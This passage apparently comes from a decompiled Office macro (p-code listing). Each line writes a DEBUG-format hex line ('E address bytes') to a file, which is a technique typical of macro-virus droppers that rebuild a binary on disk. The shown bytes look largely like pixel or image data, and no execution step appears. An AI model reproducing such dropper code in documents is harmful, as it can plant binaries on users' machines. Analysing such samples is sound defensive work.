' Line #684:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1EA0 09 F7 EF 13 E5 DF 45 4E 57 64 6D 76 6E 77 80 5A"
' 	PrintItemNL 
' Line #685:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1EB0 63 6C 5B 64 6D 57 60 69 58 61 6A 46 88 8D 09 F7"
' 	PrintItemNL 
' Line #686:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1EC0 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #687:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1ED0 09 F7 EF 4E 84 89 5D 69 73 66 72 7C 64 71 79 65"
' 	PrintItemNL 
' Line #688:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1EE0 70 78 5D 67 6E 60 66 6B 58 5B 60 0D 0C 0E 0B 06"
' 	PrintItemNL 
' Line #689:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1EF0 08 1B 50 4F 09 F7 EF 09 F7 EF 1E 10 14 26 1B 1D"
' 	PrintItemNL 
' Line #690:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1F00 1F 13 11 09 00 00 68 63 62 FF FB FD FF FB FF FF"
' 	PrintItemNL 
' Line #691:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1F10 FD FF FD FD FD FF FF FE 45 F9 F2 09 F7 EF 6B F5"
' 	PrintItemNL 
' Line #692:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1F20 F6 8A 97 B7 5D 6E 9F 22 DA E2 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #693:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1F30 09 F7 EF 09 F7 EF 15 F5 EF 8A C5 CB BD BD C9 88"
' 	PrintItemNL 
' Line #694:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1F40 D4 D9 15 F5 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #695:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1F50 EF 39 EC E8 8E 8B 9A 13 12 1C 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #696:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1F60 0A BC B6 00 01 01 01 05 06 48 4D 50 64 6A 6F 38"
' 	PrintItemNL 
' Line #697:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1F70 B4 B2 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 1C A6"
' 	PrintItemNL 
' Line #698:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1F80 A4 3A 43 47 43 4C 50 30 37 3A 1E 26 25 1B 97 91"
' 	PrintItemNL 
' Line #699:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1F90 09 F7 EF 09 F7 EF 09 F7 EF 13 D8 D2 3D 65 68 43"
' 	PrintItemNL 
' Line #700:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1FA0 4F 53 4C 58 5E 53 5F 65 49 53 5A 42 4C 53 42 4B"
' 	PrintItemNL 
' Line #701:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1FB0 4F 42 4B 4F 49 50 53 45 4C 4F 39 43 43 3B 45 45"
' 	PrintItemNL 
' Line #702:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1FC0 36 40 40 39 43 43 44 4E 4E 00 03 03 00 00 F3 F6"
' 	PrintItemNL 
' Line #703:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1FD0 F4 EA ED EB DB DD DD CF D1 D1 C2 C6 C7 B4 B8 B9"
' 	PrintItemNL 
' Line #704:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1FE0 00 02 05 6B 70 73 62 68 6D 54 5A 5F 58 60 67 49"
' 	PrintItemNL 
' Line #705:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1FF0 51 58 43 4C 55 54 5D 66 4B 63 6B 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #706:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2000 EF 09 F7 EF 09 F7 EF 09 F7 EF 4D 64 6C 6D 76 7F"
' 	PrintItemNL 
' Line #707:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2010 6D 76 7F 56 5F 68 67 70 79 64 6D 76 5E 67 70 49"
' 	PrintItemNL 
' Line #708:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2020 8C 90 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #709:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2030 EF 09 F7 EF 09 F7 EF 3F 91 94 51 5D 67 56 65 6E"
' 	PrintItemNL 
' Line #710:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2040 5B 68 70 5F 6A 72 58 60 67 5C 60 65 47 47 4D 06"
' 	PrintItemNL 
' Line #711:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2050 03 05 10 09 0C 1B 51 4F 09 F7 EF 09 F7 EF 13 47"
' 	PrintItemNL 
' Line #712:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2060 47 23 1A 1D 0F 06 03 0D 06 03 D8 D3 D2 FF FD FD"
' 	PrintItemNL 
' Line #713:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2070 FF FE FF FD FE FF F7 F7 F7 FF FF FE 36 F9 F2 09"
' 	PrintItemNL 
' Line #714:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2080 F7 EF 40 F4 F3 77 83 A7 60 73 A6 17 EB EB 09 F7"
' 	PrintItemNL 
' Line #715:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2090 EF 09 F7 EF 09 F7 EF 09 F7 EF 9F EA F6 AE AE BA"
' 	PrintItemNL 
' Line #716:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 20A0 B7 B7 C3 C5 C7 D2 86 E3 E9 09 F7 EF 09 F7 EF 09"
' 	PrintItemNL 
' Line #717:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 20B0 F7 EF 09 F7 EF 09 F7 EF 84 A2 AD 2B 2A 34 09 F7"
' 	PrintItemNL 
' Line #718:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 20C0 EF 09 F7 EF 0A BD B7 03 03 03 01 03 04 24 29 2C"
' 	PrintItemNL 
' Line #719:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 20D0 59 5F 64 13 E5 DF 09 F7 EF 09 F7 EF 09 F7 EF 09"
' 	PrintItemNL 
' Line #720:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 20E0 F7 EF 25 76 78 33 3D 44 45 4F 56 3E 47 4B 17 1F"
' 	PrintItemNL 
' Line #721:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 20F0 1E 19 95 90 09 F7 EF 09 F7 EF 09 F7 EF 35 7A 7A"
' 	PrintItemNL 
' Line #722:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2100 46 52 56 51 5D 61 52 5E 64 51 5D 63 4D 57 5E 4A"
' 	PrintItemNL 
' Line #723:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2110 54 5B 46 4F 53 44 4D 51 4A 51 54 46 4D 50 39 41"
' 	PrintItemNL 
' Line #724:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2120 41 3B 43 43 3B 43 43 43 4B 4B 4C 54 54 00 03 03"
' 	PrintItemNL 
' Line #725:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2130 00 00 F7 FA F8 ED F0 EE DD DF DF CF D1 D1 C1 C5"
' 	PrintItemNL 
' Line #726:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2140 C6 B2 B6 B7 00 00 03 68 6D 70 64 6A 6F 54 5A 5F"
' 	PrintItemNL 
' Line #727:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2150 56 5E 65 53 5B 62 51 5A 63 54 5D 66 3C 7E 83 09"
' 	PrintItemNL 
' Line #728:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2160 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 43 85"
' 	PrintItemNL 
' Line #729:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2170 8A 6C 75 7E 66 6F 78 51 5A 63 60 69 72 62 6B 74"
' 	PrintItemNL 
' Line #730:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2180 5E 67 70 3E 9D A0 09 F7 EF 09 F7 EF 09 F7 EF 27"
' 	PrintItemNL 
' Line #731:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2190 CD CA 1B DE D9 09 F7 EF 09 F7 EF 35 B2 B2 5C 68"
' 	PrintItemNL 
' Line #732:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 21A0 72 5E 6D 76 61 6E 76 60 6B 73 4C 54 5B 54 58 5D"
' 	PrintItemNL 
' Line #733:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 21B0 38 36 3C 04 00 01 14 0D 10 1A 50 4E 09 F7 EF 09"
' 	PrintItemNL 
' Line #734:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 21C0 F7 EF 1C 50 53 1C 13 16 07 00 00 56 52 4D FF FF"
' 	PrintItemNL 
' Line #735:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 21D0 FC F9 F7 F7 FD FC FE FD FF FF F9 FA F8 FB FC FA"
' 	PrintItemNL 
' Line #736:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 21E0 09 F7 EF 09 F7 EF 3D F2 F3 72 7E A6 6F 81 B6 09"
' 	PrintItemNL 
' Line #737:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 21F0 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 3E E5 EB EA EE"
' 	PrintItemNL 
' Line #738:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2200 FF B4 B5 BF AD AE B8 C6 C8 D3 D4 DA E7 23 F4 EF"
' 	PrintItemNL 
' Line #739:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2210 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 40 D5 D5 42"
' 	PrintItemNL 
' Line #740:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2220 43 4D 09 F7 EF 09 F7 EF 0C BE B8 06 07 05 00 02"
' 	PrintItemNL 
' Line #741:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2230 03 06 0A 0B 38 86 87 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #742:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2240 09 F7 EF 14 D8 D3 31 3B 42 35 3F 46 48 52 59 3B"
' 	PrintItemNL 
' Line #743:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2250 46 4A 21 2C 2A 15 91 8C 09 F7 EF 09 F7 EF 0C DE"
' 	PrintItemNL 
' Line #744:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2260 D8 3E 4A 4C 46 52 56 58 64 68 4E 5A 60 4F 5B 61"
' 	PrintItemNL 
' Line #745:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2270 57 61 68 58 62 69 4D 56 5A 44 4D 51 46 4D 50 41"
' 	PrintItemNL 
' Line #746:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2280 48 4B 3B 43 43 3A 42 42 3A 42 42 43 4B 4B 49 51"
' 	PrintItemNL 
' Line #747:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2290 51 00 01 01 00 00 F7 FA F8 ED F0 EE DC DE DE CE"
' 	PrintItemNL 
' Line #748:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 22A0 D0 D0 C0 C4 C5 B2 B6 B7 00 01 04 6A 6F 72 51 57"
' 	PrintItemNL 
' Line #749:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 22B0 5C 59 5F 64 59 61 68 4F 57 5E 4F 58 61 59 62 6B"
' 	PrintItemNL 
' Line #750:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 22C0 3C 9B 9E 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
' 	PrintItemNL 
' Line #751:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 22D0 F7 EF 36 A3 A5 68 71 7A 60 69 72 54 5D 66 4F 58"
' 	PrintItemNL 
' Line #752:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 22E0 61 59 62 6B 5E 67 70 35 B1 B1 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #753:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 22F0 09 F7 EF 47 97 9B 37 A2 A4 09 F7 EF 09 F7 EF 25"
' 	PrintItemNL 
' Line #754:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2300 CC C9 60 6C 76 5E 6D 76 60 6D 75 5A 63 6C 51 57"
' 	PrintItemNL 
' Line #755:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2310 5E 5A 5D 62 32 2E 34 05 00 02 15 0E 11 17 4D 4C"
' 	PrintItemNL 
' Line #756:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2320 09 F7 EF 09 F7 EF 1F 55 57 12 0B 10 07 02 01 CE"
' 	PrintItemNL 
' Line #757:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2330 CA C5 FF FC F8 FF FF FE F6 F6 F6 FD FF FE FF FF"
' 	PrintItemNL 
' Line #758:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2340 FC F9 FA F8 09 F7 EF 09 F7 EF 37 EC EE 71 7C A8"
' 	PrintItemNL 
' Line #759:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2350 6E 8E BF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 69"
' 	PrintItemNL 
' Line #760:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2360 C9 DE F2 F8 FF CF D0 DA B0 B1 BB CA CC D6 D4 DA"
' 	PrintItemNL 
' Line #761:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2370 E7 7C E9 ED 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #762:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2380 12 F2 EB 58 59 63 09 F7 EF 09 F7 EF 0C BE B8 08"
' 	PrintItemNL 
' Line #763:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2390 09 07 03 05 06 00 00 01 1B C0 BC 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #764:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 23A0 EF 09 F7 EF 09 F7 EF 3A 7E 82 33 3E 46 30 3B 43"
' 	PrintItemNL 
' Line #765:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 23B0 3F 4B 51 3B 46 4A 40 4B 49 15 91 8C 09 F7 EF 09"
' 	PrintItemNL 
' Line #766:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 23C0 F7 EF 07 A1 9C 2C 38 3A 3B 47 4B 4D 59 5D 48 54"
' 	PrintItemNL 
' Line #767:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 23D0 5A 49 55 5B 56 60 67 59 63 6A 50 59 5D 48 51 55"
' 	PrintItemNL 
' Line #768:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 23E0 46 4D 50 40 47 4A 3F 44 45 3C 41 42 3B 40 41 41"
' 	PrintItemNL 
' Line #769:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 23F0 46 47 43 48 49 00 00 01 00 00 F3 F6 F4 E9 EC EA"
' 	PrintItemNL 
' Line #770:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2400 DA DC DC CD CF CF C0 C4 C5 B5 B9 BA 00 04 07 6E"
' 	PrintItemNL 
' Line #771:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2410 73 76 54 5A 5F 5A 60 65 56 5E 65 4F 57 5E 4B 54"
' 	PrintItemNL 
' Line #772:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2420 5D 4F 58 61 2E AA AB 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #773:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2430 09 F7 EF 09 F7 EF 29 C1 C0 65 6E 77 60 69 72 61"
' 	PrintItemNL 
' Line #774:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2440 6A 73 55 5E 67 5E 67 70 64 6D 76 36 B2 B3 09 F7"
' 	PrintItemNL 
' Line #775:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2450 EF 09 F7 EF 09 F7 EF 5F 74 7C 55 86 8C 09 F7 EF"
' 	PrintItemNL 
' Line #776:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2460 09 F7 EF 23 D9 D5 68 74 7E 5E 6D 76 62 6D 75 57"
' 	PrintItemNL 
' Line #777:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2470 60 69 5E 64 6B 62 65 6A 2B 27 2D 07 00 03 17 0E"
' 	PrintItemNL 
' Line #778:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2480 11 14 4A 49 09 F7 EF 09 F7 EF 0E 45 48 04 00 03"
' 	PrintItemNL 
' Line #779:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2490 39 35 34 FF FF FB F5 F4 F0 FF FF FC FC FF FB FC"
' 	PrintItemNL 
' Line #780:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 24A0 FF FB FF FF FB FC FD FB 09 F7 EF 09 F7 EF 31 E5"
' 	PrintItemNL 
' Line #781:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 24B0 E8 7C 86 B6 63 AC D2 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #782:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 24C0 09 F7 EF 8D B4 D5 F4 FA FF E9 EC F4 BC BE C6 C5"
' 	PrintItemNL 
' Line #783:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 24D0 C7 D1 D1 D7 E4 C4 DC E5 09 F7 EF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #784:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 24E0 EF 09 F7 EF 09 F7 EF 4A 96 99 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #785:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 24F0 0A BD B6 09 0A 08 07 07 07 01 1F 1F 09 F7 EF 09"
' 	PrintItemNL 
' Line #786:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2500 F7 EF 09 F7 EF 09 F7 EF 1B D1 CD 4F 5A 62 38 43"
' 	PrintItemNL 
' Line #787:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2510 4B 27 32 3A 2F 3B 41 41 4C 50 45 50 4E 15 91 8C"
' 	PrintItemNL 
' Line #788:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2520 09 F7 EF 09 F7 EF 05 82 7F 1F 2B 2D 39 45 49 4B"
' 	PrintItemNL 
' Line #789:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2530 57 5B 48 54 5A 45 51 57 4C 56 5D 4C 56 5D 4D 56"
' 	PrintItemNL 
' Line #790:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2540 5A 4E 57 5B 48 4F 52 43 4A 4D 40 45 46 3E 43 44"
' 	PrintItemNL 
' Line #791:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2550 3D 42 43 3D 42 43 3D 42 43 00 00 01 00 00 F3 F6"
' 	PrintItemNL 
' Line #792:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2560 F4 E9 EC EA D9 DB DB CD CF CF C0 C4 C5 B5 B9 BA"
' 	PrintItemNL 
' Line #793:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2570 00 05 08 6F 74 77 68 6E 73 55 5B 60 52 5A 61 56"
' 	PrintItemNL 
' Line #794:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2580 5E 65 54 5D 66 52 5B 64 20 C7 C4 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #795:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2590 EF 09 F7 EF 09 F7 EF 09 F7 EF 19 DD D8 61 6A 73"
' 	PrintItemNL 
' Line #796:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 25A0 60 69 72 6E 77 80 5E 67 70 5E 67 70 61 6A 73 2F"
' 	PrintItemNL 
' Line #797:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 25B0 B9 B8 09 F7 EF 09 F7 EF 09 F7 EF 60 67 70 72 77"
' 	PrintItemNL 
' Line #798:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 25C0 80 09 F7 EF 09 F7 EF 09 F7 EF 61 6D 77 56 65 6E"
' 	PrintItemNL 
' Line #799:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 25D0 5A 65 6D 4C 55 5E 60 63 6B 5D 5D 63 20 19 20 07"
' 	PrintItemNL 
' Line #800:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 25E0 00 03 1A 11 14 15 4A 49 09 F7 EF 09 F7 EF 04 3E"
' 	PrintItemNL 
' Line #801:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 25F0 3F 17 13 19 9B 99 99 FF FF FC FF FF FA FF FF FB"
' 	PrintItemNL 
' Line #802:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2600 FD FF FB FA FE F8 FB FD F7 FE FE FE 09 F7 EF 09"
' 	PrintItemNL 
' Line #803:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2610 F7 EF 2A DE E2 8D 96 C8 69 B3 D8 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #804:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2620 EF 09 F7 EF 09 F7 EF 91 9E C4 ED F4 FF F6 F9 FF"
' 	PrintItemNL 
' Line #805:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2630 D0 D2 DA BF C2 CA CA D0 DD CA D3 DD 49 EF EB 09"
' 	PrintItemNL 
' Line #806:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2640 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 31 C7 C5 09 F7"
' 	PrintItemNL 
' Line #807:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2650 EF 09 F7 EF 0A BC B5 09 0A 08 07 07 07 05 8B 87"
' 	PrintItemNL 
' Line #808:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2660 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 45 7A 7F 4F"
' 	PrintItemNL 
' Line #809:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2670 5A 62 39 44 4C 27 32 3A 24 31 39 3D 49 4D 48 53"
' 	PrintItemNL 
' Line #810:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2680 51 22 9E 99 09 F7 EF 09 F7 EF 13 66 65 0A 16 18"
' 	PrintItemNL 
' Line #811:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2690 28 34 38 37 43 47 46 52 58 47 53 59 49 53 5A 41"
' 	PrintItemNL 
' Line #812:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 26A0 4B 52 46 4F 53 4C 55 59 44 4B 4E 41 48 4B 3D 42"
' 	PrintItemNL 
' Line #813:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 26B0 43 41 45 46 43 47 48 40 44 45 3D 41 42 00 00 01"
' 	PrintItemNL 
' Line #814:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 26C0 00 00 F7 FA F8 EC EF ED DB DD DD CD CF CF BF C3"
' 	PrintItemNL 
' Line #815:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 26D0 C4 B3 B7 B8 00 02 05 6C 71 74 6C 72 77 50 56 5B"
' 	PrintItemNL 
' Line #816:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 26E0 4E 56 5D 4B 53 5A 4A 53 5C 55 5E 67 1B D0 CC 09"
' 	PrintItemNL 
' Line #817:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 26F0 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #818:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2700 EF 5C 65 6E 5F 68 71 75 7E 87 62 6B 74 5E 67 70"
' 	PrintItemNL 
' Line #819:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2710 64 6D 76 20 D6 D2 09 F7 EF 09 F7 EF 20 D5 D1 5E"
' 	PrintItemNL 
' Line #820:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2720 65 6E 7A 7F 88 13 E5 DF 09 F7 EF 09 F7 EF 62 6F"
' 	PrintItemNL 
' Line #821:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
